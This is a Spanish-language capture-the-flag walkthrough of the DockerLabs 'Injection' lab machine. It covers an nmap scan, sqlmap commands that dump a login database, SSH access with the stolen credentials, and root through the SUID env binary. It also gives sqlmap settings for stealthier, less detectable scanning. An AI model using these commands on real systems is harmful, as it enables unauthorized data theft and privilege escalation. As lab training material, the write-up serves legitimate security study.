Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Injection".
Una vez hecho , descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh injection.tar
```
Tras desplegarse la maquina, hacemos un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 -n -Pn -vvv 172.17.0.2
```
y vemos que tiene 2 puertos abiertos, el 22 (SSH) y el 80 (HTTP):
```
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
```
Lo primero que haremos sera poner la IP en el navegador para ver si es posible obtener alguna informacion util.
Vemos un panel de Login, por lo que vamos a intentar realizar alguna "SQL Injection" para ver si podemos acceder a alguna BBDD, ya que no tenemos ningun usuario ni ninguna contraseña.
Para ello podemos usar 2 metodos bastante sencillos. Uno largo, y otro corto, asi que empezaremos primero por el largo:

#### **METODO LARGO:**
Vamos a empezar con SQLMAP utilizando el siguiente comando:
```
sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
                    
	--forms = es para decirle que vaya atacando los formulario HTML que vaya encontrando (en este caso, el formulario de Login)
	--dbs = es lo primero que tenemos que hacer pq antes de nada hay que enumerar/encontrar las BBDD existentes
	--batch = escribimos esto para que lo haga de forma automatica y sin preguntarnos. Una automatizacion, sin mas.
```

**NOTA: SI QUEREMOS UN ESCANEO MUCHISIMO MAS SILENCIOSO (Y MAS LENTO, LOGICAMENTE) AÑADIRIAMOS LOS PARAMETROS DE AQUI ABAJO:**

```
	--flush-session --threads=2 --random-agent --delay=5 --time-sec=5 --safe-url=http://192.168.1.154/administrator/ --safe-freq=20 --level=2 --risk=2

		--flush-session  = limpia la sesion antigua para que no utilice esos datos y hacer asi menos "ruido".
	    --threads=2      = numero de hilos en ejecucion. Cuanto menos mejor ya que hace menos "ruido", pero claro mucho mas lento. Usamos 2 hilos a la vez.
        --random-agent   = utiliza "user agents" aleatorios por cada solicitud. Hace que parezcan diferentes usuarios de diferentes Sistemas Operativos (Linux, Mac OS, Windows...)
		--delay=5        = añadir un retraso entre solicitudes, por lo que reducimos su frecuencia. Retraso de 5 segundos.
        --time-sec=5     = tiempo de espera en caso de que el servidor devuelva respuestas lentas. Esperamos 5 segundos.
		        === Estos dos parametros van juntos ===
        --safe-url=http://192.168.1.154/administrator/  = Es la misma que con el parametro "-u". Se comprueba que el escaneo NO este modificando el comportamiento de dicha "url".
        --safe-freq=20   = Le decimos que cada 20 solicitudes, realice una a la "url" correcta para ver si ha habido alguna alteracion en dicha Web, o no. 
		        === Estos dos parametros tambien suelen ir juntos ===
        --level=2        = Estamos especificando el nivel del test a ejecutar
        --risk=2         = Decimos el nivel de riegos a ejecutar. 
```
Tras lanzar el SQLMAP, vemos en la terminal la siguiente informacion:
```
available databases [5]:
	[*] information_schema
	[*] mysql
	[*] performance_schema
	[*] register
	[*] sys
```
**NOTA: Hay que tener en cuenta que TODAS los "schema" tienen las 3 primeras BBDD y la normalmente tambien la ultima "sys", por lo que tenemos que atacar "register"**
Ahora volvemos a lanzar el comando SQLMAP pero con algun pequeño cambio:
```
sqlmap -u http://172.17.0.2/index.php --forms -D register --tables --batch

	-D + NOMBREBASEDATOS = decimos a SQLMAP en que BBDD tiene que buscar
	--tables = le decimos a SQLMAP, qué tiene que buscar dentro de la BBDD que le hemos pasado con el parametro "-D"
```
Y vemos lo siguiente:
```
Database: register

	[1 table]
	+-------+
	| users |
	+-------+
```
Bien, momento ahora de buscar las columnas que hay en esa tabla. Para ello, una vez mas, usaremos SQLMAP:
```
sqlmap -u http://172.17.0.2/index.php --forms -D register -T users --columns --batch

	-T + NOMBRETABLA = le decimos a SQLMAP dentro de que tabla tiene que buscar
	--colums = le decimos que nos busque las columnas dentro de la tabla que hemos pasado con el parametro "-T"
```
Este comando nos devuelve lo siguiente (en este caso):
```
Database: register

	Table: users
	[2 columns]
	+----------+-------------+
	| Column   | Type        |
	+----------+-------------+
	| passwd   | varchar(30) |
	| username | varchar(30) |
	+----------+-------------+
```
Finalmente, habria que ver el contenido existente en esas columnas, es decir, sus registros.
Para ello, escribimos el comando:
```
sqlmap -u http://172.17.0.2/index.php --forms -D register -T users -C username,passwd --dump --batch

	-C + NOMBRECOLUMNA/S = indicamos a SQLMAP que columna/s queremos. En caso de ser mas de 1 columna, las separaremos por "," SIN espacio
	--dump = le decimos a SQLMAP que nos saque la informacion de dichas columnas y nos lo vuelque a un archivo ".csv" (lo hace automaticamente)
```
Esto nos da un resultado final y nos muestra los registros de ambas columnas y aparte, nos informa donde y como se llama el archivo creado con el "--dump".
```
Database: register

	Table: users
	[1 entry]
	+----------+------------------+
	| username | passwd           |
	+----------+------------------+
	| dylan    | KJSDFG789FGSDF78 |
	+----------+------------------+

[16:41:05] [INFO] table 'register.users' dumped to CSV file '/root/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv'                               
[16:41:05] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-06122024_0441pm.csv'
```
Ahora probamos si funcionan el usuario y la contraseña en el panel de Login; y curiosamente, SI funcionan ;).

#### **METODO CORTO:**
Aunque tambien se utiliza SQLMAP, empezariamos usando otro programita: BURPSUITE.
Lo abrimos EN MODO ROOT (importante) y tras configurar el navegador con el proxy "127.0.0.1" y activar el modo "Intercept On" del BURPSUITE, haremos Login en el panel con un usuario y una contraseña cualquiera, ya que se trata solamente de capturar la peticion.
Una vez capturada la peticion, le daremos al boton derecho del raton y seleccionaremos "Save Item" y grabaremos la peticion en un archivo que llamaremos "archivoInjection.txt" por ejemplo.
Ahora ya, cerrariamos BURPSUITE y pasariamos a utilizar SQLMAP, que es donde vamos a usar el metodo "abreviado" a traves del comando:
```
sqlmap -r archivoInjection.txt --dump --batch
```
Esto nos daria directamente el resultado final, lo que nos evitaria estar metiendo los comando uno por uno como hemos hecho en el "MODO LARGO"
Ademas de eso, como en los otros, tambien nos muestra los registros de ambas columnas y aparte, nos informa donde y como se llama el archivo creado con el "--dump".
```
Database: register

	Table: users
	[1 entry]
	+----------+------------------+
	| username | passwd           |
	+----------+------------------+
	| dylan    | KJSDFG789FGSDF78 |
	+----------+------------------+

[16:41:05] [INFO] table 'register.users' dumped to CSV file '/root/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv'                               
[16:41:05] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-06122024_0441pm.csv'
```

Una vez introducidos tanto el usuario como la contraseña, vemos un mensaje en pantalla que dice:
```
Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
```
Ahora lo que haremos sera intentar entrar por el protocolo SSH con el usuario y la contraseña obtenidos; para ello escribimos:
```
ssh dylan@172.17.0.2
```
Contestaremos "yes" a la primera pregunta y despues meteremos la contraseña, y ya estamos dentro.
Ahora nos tocaria hacer la escalada de privilegios, por lo que probaremos primeramente "sudo -l" y nos dice que no encuentra el comando. Es hora de probar una segunda forma que seria con el comando "find / -perm -4000 2>/dev/null":
```
dylan@20f192a37dea:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/env   <===== Binario que vamos a utilizar
/usr/bin/newgrp
```
Bien, con este comando parece que funciona. Entre los binarios obtenidos vemos el binario "/usr/bin/env" que sera el que utilizaremos para hacer nuestra escalada de privilegios.
Para ello, iremos a la pagina "https://gtfobins.github.io" y buscaremos "env".
Una vez encontrado, nos dirigiremos a la seccion "SUID" y veremos que nos dice que para escalar privilegios habria que ejecutar:
```
./env /bin/sh -p
```
**NOTA: Podriamos hacer esto mismo sin ir la pagina de "gtfobins" simplemente habiendo instalado "searchbins" y buscandolo directamente con el comando:**
```
searchbins -b env -f suid

	-b = binario a buscar (en este caso "env")
	-f = funcion deseada (en este caso "suid")
```
**FIN DE LA NOTA**

Es momento ahora de ejecutarlo en la terminal, PERO, con la ruta completa de "./env" tal y como se ve a continuacion:
```
/usr/bin/env /bin/sh -p
```
Y finalmente, escribiendo "whoami" se puede ver:
```
# whoami
root
#
```
No obstante, si escribieramos:
```
bash -p
```
obtendriamos un prompt diferente y algo mas "normal" tal y como se puede ver aqui abajo:
```
bash-5.1# whoami
root
bash-5.1#
```
Y ahora si... ya estaria la maquina hecha :)


